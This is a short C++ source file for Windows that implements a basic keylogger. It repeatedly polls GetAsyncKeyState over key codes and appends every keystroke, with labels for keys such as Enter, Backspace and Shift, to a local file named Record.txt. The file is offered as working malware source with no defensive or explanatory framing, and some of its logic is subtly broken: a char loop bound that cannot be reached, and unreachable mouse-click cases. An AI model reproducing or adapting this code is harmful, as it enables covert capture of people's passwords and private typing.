#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

#pragma warning (disable : 6295);

using namespace std;

void log();

int main() {

	log();

	return 0;
}

void log() {
	char c;

	for (;;) {

		for (c = 8; c <= 222; c++) {
			if (GetAsyncKeyState(c) == -32767) {

				ofstream write("Record.txt", ios::app);
				switch (c) {

				case 8: 
					write << "<BackSpace>";
					break;

				case 27: 
					write << "<Esc>";
					break;

				case 127: 
					write << "<DEL>";
					break;

				case 32: 
					write << " ";
					break;

				case 13: 
					write << "<ENTER>\n";
					break;

				case 64:
					write << "@";
					break;

				case 46:
					write << ".";
					break;

				case 16:
					write << "<Shift>";
					break;

				case 20:
					write << "<CapsLock>";
					break;

				case 1:
					write << "<Left-Click>";
					break;

				case 2:
					write << "<Right-Click>";
					break;

				case 9:
					write << "<TAB>";
					break;

				default: 

					write << c;
					break;
				
				}
				write.close();
				
			}
		}
	}
	
}